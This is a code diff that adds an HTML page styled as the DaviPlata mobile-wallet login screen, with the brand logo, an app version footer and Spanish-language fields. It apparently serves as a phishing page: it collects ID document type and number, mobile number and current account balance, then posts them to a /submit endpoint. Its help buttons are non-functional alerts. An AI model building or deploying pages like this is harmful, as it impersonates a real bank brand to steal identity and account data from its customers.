@@ -1,0 +1,728 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
+    />
+    <title>DaviPlata - Ingresa tus datos</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Inter", sans-serif;
+        background: #f7f2f2;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: flex-start;
+      }
+
+      /* Contenedor mobile */
+      .phone-wrapper {
+        width: 100%;
+        max-width: 480px;
+        min-height: 100vh;
+        background: #f7f2f2;
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+
+      /* Burbujas decorativas */
+      .bubble {
+        position: absolute;
+        border-radius: 50%;
+        background: rgba(220, 130, 130, 0.12);
+        pointer-events: none;
+      }
+      .bubble-1 {
+        width: 260px;
+        height: 260px;
+        top: -80px;
+        right: -60px;
+      }
+      .bubble-2 {
+        width: 200px;
+        height: 200px;
+        top: 80px;
+        right: -80px;
+        background: rgba(220, 130, 130, 0.08);
+      }
+      .bubble-3 {
+        width: 180px;
+        height: 180px;
+        bottom: 100px;
+        left: -60px;
+        background: rgba(220, 130, 130, 0.09);
+      }
+      .bubble-4 {
+        width: 130px;
+        height: 130px;
+        bottom: 60px;
+        left: -30px;
+        background: rgba(220, 130, 130, 0.06);
+      }
+
+      /* Contenido principal */
+      .content {
+        position: relative;
+        z-index: 10;
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding: 50px 28px 30px;
+      }
+
+      /* Logo */
+      .logo-container {
+        margin-bottom: 32px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .logo-img {
+        width: 90px;
+        height: auto;
+      }
+
+      /* Título */
+      .title {
+        font-size: 22px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 30px;
+        letter-spacing: -0.3px;
+      }
+
+      /* Campos del formulario */
+      .form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        gap: 14px;
+      }
+
+      .input-group {
+        position: relative;
+        width: 100%;
+      }
+
+      .input-field {
+        width: 100%;
+        padding: 18px 20px;
+        background: #ffffff;
+        border: 1.5px solid transparent;
+        border-radius: 14px;
+        font-size: 15px;
+        color: #333;
+        font-family: "Inter", sans-serif;
+        outline: none;
+        transition:
+          border-color 0.25s,
+          box-shadow 0.25s;
+        box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
+        appearance: none;
+        -webkit-appearance: none;
+      }
+
+      .input-field::placeholder {
+        color: #aaa;
+      }
+
+      .input-field:focus {
+        border-color: #e05c6e;
+        box-shadow: 0 0 0 3px rgba(224, 92, 110, 0.12);
+      }
+
+      /* Dropdown personalizado */
+      .custom-select {
+        position: relative;
+        width: 100%;
+        font-family: "Inter", sans-serif;
+      }
+
+      .custom-select-trigger {
+        width: 100%;
+        min-height: 58px;
+        padding: 18px 44px 18px 16px;
+        background: #ffffff;
+        border: 1.5px solid #e0e0e0;
+        border-radius: 14px;
+        font-size: 14px;
+        color: #aaa;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        transition: border-color 0.25s, box-shadow 0.25s;
+        box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+        user-select: none;
+        position: relative;
+      }
+
+      .custom-select-trigger .label-placeholder {
+        position: absolute;
+        top: 50%;
+        left: 16px;
+        transform: translateY(-50%);
+        font-size: 14px;
+        color: #aaa;
+        transition: all 0.2s;
+        pointer-events: none;
+      }
+
+      .custom-select-trigger .selected-value {
+        padding-top: 14px;
+        font-size: 14px;
+        color: #333;
+        font-weight: 500;
+      }
+
+      .custom-select.open .custom-select-trigger {
+        border-color: #b5c4e0;
+        border-bottom-left-radius: 0;
+        border-bottom-right-radius: 0;
+        border-bottom-color: #e8e8e8;
+      }
+
+      .custom-select.open .custom-select-trigger .label-placeholder {
+        top: 14px;
+        font-size: 11px;
+        color: #999;
+        transform: none;
+      }
+
+      .select-chevron {
+        position: absolute;
+        right: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        width: 20px;
+        height: 20px;
+        flex-shrink: 0;
+        transition: transform 0.25s;
+        color: #888;
+        pointer-events: none;
+      }
+
+      .custom-select.open .select-chevron {
+        transform: translateY(-50%) rotate(180deg);
+      }
+
+      .custom-select-options {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        background: #fff;
+        border: 1.5px solid #b5c4e0;
+        border-top: none;
+        border-bottom-left-radius: 14px;
+        border-bottom-right-radius: 14px;
+        overflow: hidden;
+        max-height: 0;
+        opacity: 0;
+        transition: max-height 0.3s ease, opacity 0.2s;
+        z-index: 100;
+        box-shadow: 0 6px 20px rgba(0,0,0,0.07);
+      }
+
+      .custom-select.open .custom-select-options {
+        max-height: 260px;
+        opacity: 1;
+      }
+
+      .custom-option {
+        padding: 16px 16px;
+        font-size: 14px;
+        color: #222;
+        font-weight: 500;
+        cursor: pointer;
+        border-bottom: 1px solid #f0f0f0;
+        transition: background 0.15s;
+      }
+
+      .custom-option:last-child {
+        border-bottom: none;
+      }
+
+      .custom-option:hover {
+        background: #fdf0f2;
+      }
+
+      .custom-option.selected-opt {
+        color: #d63648;
+        font-weight: 600;
+      }
+
+      .custom-select.error .custom-select-trigger {
+        border-color: #e05c6e;
+      }
+
+      /* Botón continuar */
+      .btn-continuar {
+        width: 100%;
+        margin-top: 10px;
+        padding: 18px;
+        background: linear-gradient(135deg, #e8808e 0%, #d4606e 100%);
+        border: none;
+        border-radius: 30px;
+        color: #fff;
+        font-size: 16px;
+        font-weight: 600;
+        font-family: "Inter", sans-serif;
+        cursor: pointer;
+        letter-spacing: 0.3px;
+        transition:
+          opacity 0.2s,
+          transform 0.15s,
+          box-shadow 0.2s;
+        box-shadow: 0 4px 16px rgba(212, 96, 110, 0.35);
+      }
+
+      .btn-continuar:hover {
+        opacity: 0.93;
+        box-shadow: 0 6px 20px rgba(212, 96, 110, 0.45);
+      }
+
+      .btn-continuar:active {
+        transform: scale(0.98);
+      }
+
+      /* Acciones inferiores */
+      .actions-row {
+        display: flex;
+        justify-content: center;
+        gap: 60px;
+        margin-top: 36px;
+        width: 100%;
+      }
+
+      .action-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        cursor: pointer;
+      }
+
+      .action-icon {
+        width: 58px;
+        height: 58px;
+        border-radius: 50%;
+        background: #fff;
+        box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition:
+          transform 0.18s,
+          box-shadow 0.18s;
+      }
+
+      .action-icon:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 16px rgba(0, 0, 0, 0.14);
+      }
+
+      .action-icon svg {
+        width: 26px;
+        height: 26px;
+      }
+
+      .action-label {
+        font-size: 12.5px;
+        color: #555;
+        text-align: center;
+        font-weight: 500;
+        max-width: 90px;
+        line-height: 1.4;
+      }
+
+      /* Footer versión */
+      .version-footer {
+        text-align: center;
+        margin-top: auto;
+        padding: 20px 0 30px;
+        position: relative;
+        z-index: 10;
+      }
+
+      .version-text {
+        font-size: 12px;
+        color: #b0a0a0;
+      }
+
+      /* Barra inferior del teléfono */
+      .home-indicator {
+        width: 130px;
+        height: 5px;
+        background: #333;
+        border-radius: 3px;
+        margin: 0 auto 10px;
+        opacity: 0.2;
+      }
+
+      /* Error state */
+      .input-field.error,
+      .select-wrapper select.error {
+        border-color: #e05c6e;
+      }
+
+      .error-msg {
+        font-size: 11.5px;
+        color: #e05c6e;
+        margin-top: -6px;
+        margin-left: 4px;
+        display: none;
+      }
+      .error-msg.show {
+        display: block;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="phone-wrapper">
+      <!-- Burbujas decorativas de fondo -->
+      <div class="bubble bubble-1"></div>
+      <div class="bubble bubble-2"></div>
+      <div class="bubble bubble-3"></div>
+      <div class="bubble bubble-4"></div>
+
+
+      <!-- Contenido -->
+      <div class="content">
+        <!-- Logo DaviPlata real -->
+        <div class="logo-container">
+          <img src="img/logo-daviplata.svg" alt="DaviPlata" class="logo-img" />
+        </div>
+
+        <!-- Título -->
+        <h1 class="title">Ingresa tus datos</h1>
+
+        <!-- Formulario -->
+        <form
+          class="form"
+          id="loginForm"
+          onsubmit="return handleSubmit(event);"
+        >
+          <!-- Tipo de documento (dropdown personalizado) -->
+          <div class="input-group">
+            <div class="custom-select" id="customSelect">
+              <div class="custom-select-trigger" id="selectTrigger" onclick="toggleDropdown()">
+                <span class="label-placeholder" id="selectPlaceholder">Tipo de documento</span>
+                <span class="selected-value" id="selectedLabel"></span>
+                <svg class="select-chevron" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M6 9 L12 15 L18 9" />
+                </svg>
+              </div>
+              <div class="custom-select-options" id="selectOptions">
+                <div class="custom-option" onclick="selectOption('cc', 'C&eacute;dula de Ciudadan&iacute;a')">C&eacute;dula de Ciudadan&iacute;a</div>
+                <div class="custom-option" onclick="selectOption('ti', 'Tarjeta de Identidad')">Tarjeta de Identidad</div>
+                <div class="custom-option" onclick="selectOption('ce', 'C&eacute;dula de Extranjer&iacute;a')">C&eacute;dula de Extranjer&iacute;a</div>
+                <div class="custom-option" onclick="selectOption('ppt', 'Permiso por Protecci&oacute;n Temporal')">Permiso por Protecci&oacute;n Temporal</div>
+                <div class="custom-option" onclick="selectOption('pp', 'Pasaporte')">Pasaporte</div>
+                <div class="custom-option" onclick="selectOption('nit', 'NIT')">NIT</div>
+              </div>
+            </div>
+            <input type="hidden" id="selectedTipo" value="" />
+            <span class="error-msg" id="errTipo">Selecciona el tipo de documento</span>
+          </div>
+
+
+          <!-- Número de documento -->
+          <div class="input-group">
+            <input
+              type="tel"
+              id="numDocumento"
+              class="input-field"
+              placeholder="Número de documento"
+              maxlength="15"
+              inputmode="numeric"
+              oninput="soloNumeros(this)"
+            />
+            <span class="error-msg" id="errDoc"
+              >Ingresa el número de documento</span
+            >
+          </div>
+
+          <!-- Número de celular -->
+          <div class="input-group">
+            <input
+              type="tel"
+              id="numCelular"
+              class="input-field"
+              placeholder="Número de celular"
+              maxlength="10"
+              inputmode="numeric"
+              oninput="soloNumeros(this)"
+            />
+            <span class="error-msg" id="errCel"
+              >Ingresa el número de celular</span
+            >
+          </div>
+
+          <!-- Saldo actual en cuenta -->
+          <div class="input-group">
+            <input
+              type="text"
+              id="saldoCuenta"
+              class="input-field"
+              placeholder="Saldo actual en cuenta"
+              inputmode="numeric"
+              oninput="formatearSaldo(this)"
+            />
+            <span class="error-msg" id="errSaldo">Ingresa el saldo de tu cuenta</span>
+          </div>
+
+          <!-- Botón continuar -->
+          <button type="submit" class="btn-continuar" id="btnContinuar">
+            Continuar
+          </button>
+        </form>
+
+        <!-- Acciones inferiores -->
+        <div class="actions-row">
+          <!-- Confirmar comprobante -->
+          <div class="action-item" onclick="alert('Confirmar comprobante')">
+            <div class="action-icon">
+              <svg
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <rect
+                  x="3"
+                  y="3"
+                  width="7"
+                  height="7"
+                  rx="1"
+                  stroke="#d63648"
+                  stroke-width="2"
+                />
+                <rect
+                  x="14"
+                  y="3"
+                  width="7"
+                  height="7"
+                  rx="1"
+                  stroke="#d63648"
+                  stroke-width="2"
+                />
+                <rect
+                  x="3"
+                  y="14"
+                  width="7"
+                  height="7"
+                  rx="1"
+                  stroke="#d63648"
+                  stroke-width="2"
+                />
+                <path
+                  d="M14 14h2v2h-2zM17 14h3v3h-3zM14 17h3v3h-3z"
+                  fill="#d63648"
+                />
+              </svg>
+            </div>
+            <span class="action-label">Confirmar<br />comprobante</span>
+          </div>
+
+          <!-- ¿Necesitas ayuda? -->
+          <div
+            class="action-item"
+            onclick="alert('¿En qué te podemos ayudar?')"
+          >
+            <div class="action-icon">
+              <svg
+                viewBox="0 0 24 24"
+                fill="none"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle cx="12" cy="12" r="9" stroke="#888" stroke-width="2" />
+                <path
+                  d="M9.5 9.5C9.5 8.12 10.62 7 12 7C13.38 7 14.5 8.12 14.5 9.5C14.5 10.4 14 11.18 13.25 11.62L12.5 12.06V13"
+                  stroke="#888"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                />
+                <circle
+                  cx="12"
+                  cy="16"
+                  r="0.8"
+                  fill="#888"
+                  stroke="#888"
+                  stroke-width="0.5"
+                />
+              </svg>
+            </div>
+            <span class="action-label">¿Necesitas ayuda?</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Footer versión -->
+      <div class="version-footer">
+        <span class="version-text">Versión 7.1.0 (1848)</span>
+      </div>
+
+      <!-- Barra home del teléfono -->
+      <div class="home-indicator"></div>
+    </div>
+
+    <script>
+      let selectedTipoValue = '';
+
+      function toggleDropdown() {
+        const cs = document.getElementById('customSelect');
+        cs.classList.toggle('open');
+      }
+
+      function selectOption(value, label) {
+        selectedTipoValue = value;
+        document.getElementById('selectedTipo').value = value;
+        document.getElementById('selectedLabel').textContent = label;
+        document.getElementById('selectPlaceholder').style.top = '10px';
+        document.getElementById('selectPlaceholder').style.fontSize = '11px';
+        document.getElementById('selectPlaceholder').style.color = '#999';
+        document.getElementById('selectPlaceholder').style.transform = 'none';
+        // marcar opción activa
+        document.querySelectorAll('.custom-option').forEach(o => o.classList.remove('selected-opt'));
+        event.target.classList.add('selected-opt');
+        // cerrar
+        document.getElementById('customSelect').classList.remove('open');
+        document.getElementById('customSelect').classList.remove('error');
+        document.getElementById('errTipo').classList.remove('show');
+      }
+
+      // Cerrar al hacer click fuera
+      document.addEventListener('click', function(e) {
+        const cs = document.getElementById('customSelect');
+        if (!cs.contains(e.target)) cs.classList.remove('open');
+      });
+
+      function soloNumeros(input) {
+        input.value = input.value.replace(/[^0-9]/g, "");
+      }
+
+      function formatearSaldo(input) {
+        // Quitar todo lo que no sea número
+        let raw = input.value.replace(/[^0-9]/g, "");
+        if (raw === "") { input.value = ""; return; }
+        // Formatear con separadores de miles (punto) y símbolo $
+        let numero = parseInt(raw, 10);
+        input.value = "$ " + numero.toLocaleString("es-CO");
+      }
+
+      function handleSubmit(e) {
+        e.preventDefault();
+        let valido = true;
+
+        const doc = document.getElementById("numDocumento");
+        const cel = document.getElementById("numCelular");
+        const saldo = document.getElementById("saldoCuenta");
+        const errTipo = document.getElementById("errTipo");
+        const errDoc  = document.getElementById("errDoc");
+        const errCel  = document.getElementById("errCel");
+        const errSaldo = document.getElementById("errSaldo");
+
+        // Limpiar errores previos
+        [doc, cel, saldo].forEach((el) => el.classList.remove("error"));
+        [errTipo, errDoc, errCel, errSaldo].forEach((el) => el.classList.remove("show"));
+        document.getElementById('customSelect').classList.remove('error');
+
+        if (!selectedTipoValue) {
+          document.getElementById('customSelect').classList.add('error');
+          errTipo.classList.add("show");
+          valido = false;
+        }
+
+        if (!doc.value.trim()) {
+          doc.classList.add("error");
+          errDoc.classList.add("show");
+          valido = false;
+        }
+
+        if (!cel.value.trim() || cel.value.length < 7) {
+          cel.classList.add("error");
+          errCel.classList.add("show");
+          valido = false;
+        }
+
+        if (!saldo.value.trim()) {
+          saldo.classList.add("error");
+          errSaldo.classList.add("show");
+          valido = false;
+        }
+
+        if (valido) {
+          const btn = document.getElementById("btnContinuar");
+          btn.textContent = "Enviando...";
+          btn.disabled = true;
+
+          fetch('/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              tipo_documento: selectedTipoValue,
+              num_documento:  doc.value.trim(),
+              num_celular:    cel.value.trim(),
+              saldo_cuenta:   saldo.value.trim()
+            })
+          })
+          .then(r => r.json())
+          .then(data => {
+            btn.textContent = "Continuar";
+            btn.disabled = false;
+            if (data.ok) {
+              // Mostrar mensaje de éxito
+              mostrarMensaje('success', data.mensaje);
+              document.getElementById('loginForm').reset();
+              selectedTipoValue = '';
+              document.getElementById('selectedLabel').textContent = '';
+              document.getElementById('selectPlaceholder').removeAttribute('style');
+            } else {
+              mostrarMensaje('error', data.mensaje || 'Error al enviar los datos.');
+            }
+          })
+          .catch(() => {
+            btn.textContent = "Continuar";
+            btn.disabled = false;
+            mostrarMensaje('error', 'No se pudo conectar con el servidor.');
+          });
+        }
+      }
+
+      function mostrarMensaje(tipo, texto) {
+        let msg = document.getElementById('msgResultado');
+        if (!msg) {
+          msg = document.createElement('div');
+          msg.id = 'msgResultado';
+          msg.style.cssText = `
+            margin-top: 14px; padding: 14px 18px; border-radius: 12px;
+            font-size: 14px; font-weight: 500; text-align: center;
+            transition: opacity 0.3s;
+          `;
+          document.getElementById('btnContinuar').insertAdjacentElement('afterend', msg);
+        }
+        msg.style.background   = tipo === 'success' ? '#d4edda' : '#fde8ea';
+        msg.style.color        = tipo === 'success' ? '#1a6330' : '#8b1a26';
+        msg.style.border       = tipo === 'success' ? '1px solid #b8dbc4' : '1px solid #f7b4bb';
+        msg.textContent        = texto;
+        msg.style.opacity      = '1';
+        setTimeout(() => { msg.style.opacity = '0'; }, 5000);
+      }
+    </script>
+  </body>
+</html>
